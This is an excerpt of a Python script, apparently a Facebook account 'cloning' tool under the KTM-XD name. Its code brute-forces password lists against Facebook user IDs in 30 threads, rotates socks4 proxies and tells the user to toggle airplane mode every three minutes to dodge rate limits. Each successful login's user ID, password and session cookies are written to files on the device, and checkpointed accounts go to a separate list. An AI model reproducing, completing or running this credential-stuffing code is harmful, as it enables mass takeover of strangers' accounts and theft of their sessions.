...
\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m 𝙵𝙰𝙲𝙴𝙱𝙾𝙾𝙺   \x1b[1;92m   <>\x1b[1;92m   anik Hossain 
...
def file():
    ...
    with ThreadPool(max_workers=30) as sexy:
        tl = str(len(fo))
        clear()
        print(f'{G1}[{A}✔︎{G1}]{G1} 𝚈𝙾𝚄𝚁 𝙲𝙻𝙸𝙽𝙸𝙽𝙶 𝚃𝙾𝚃𝙰𝙻 𝙸𝙳𝚂 {A}➢{G1} {tl}')
        print(f'\033[1;91m[\033[1;92m✔︎\033[1;91m]\033[1;92m𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝚂𝚃𝙰𝚁𝚃 𝙱𝚁𝙾𝚃𝙷𝙴𝚁💙')
        print('\033[1;31m[\033[1;32m✔︎\033[1;31m] \033[1;33m𝚈𝙾𝚄𝚁 𝙲𝙻𝙾𝙽𝙸𝙽𝙶 𝙲𝙷𝙾𝙸𝙲𝙴 𝙼𝙴𝚃𝙷𝙾𝙳 >> M4')
        print(f"{G1}[{A}✔︎{G1}]{G1} TURN {G1}[{A}ON{G1}/{A}OFF{G1}] AIRPLANE MODE EVERY {A}3{G1} MIN");linex()
        for user in fo:
...
def randm(ids,psd):
    ...
    sys.stdout.write(f'\r\r{A}[{G1}KTM-XD{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        for pas in psd:
            ...
            if 'access_token' in q:
                ...
                if res == 'LIVE':
                	print(f'\r\r{A}[{G1}KTM-OK{A}]{G1} {uid} {A}|{G1} {pas}');open('/sdcard/SWAG-RNDM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n');ok.append(uid);break
                if res == 'LOCK':
                	print(f'\r\r{A}[{S}KTM-LK{A}]{S} {uid} {A}|{S} {pas}');break
            else:continue
        loop+=1
    except Exception as e:
        pass
...
def M1(ids,names,psd):
    ...
    nip=random.choice(prox)
    proxs= {'http': 'socks4://'+nip}
    sys.stdout.write(f'\r\r{A}[{G1}KTM-M4{A}]-[{G1}{loop}{A}]-[{G1}OK{A}:{G1}{len(ok)}{A}] ')
    sys.stdout.flush()
    try:
        fn = names.split(' ')[0]
        ...
        for pw in psd:
            ...
            if 'access_token' in po:
                print(f'\r\r{A}[{G1}KTM-OK{A}]{G1} {ids} {A}|{G1} {pas}')
                coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                open('/sdcard/KTM-OK.txt','a').write(uid+'|'+pas+'|'+coki+'\n')
                ok.append(ids)
                break
            elif 'www.facebook.com' in po['error']['message']:
                print(f'\r\r{A}[{M}KTM-CP{A}]{M} {ids} {A}|{M} {pas}')
                open('/sdcard/KTM-CP.txt','a').write(ids+'|'+pas+'\n')
            else:continue
        loop+=1
    except Exception as e:
        pass
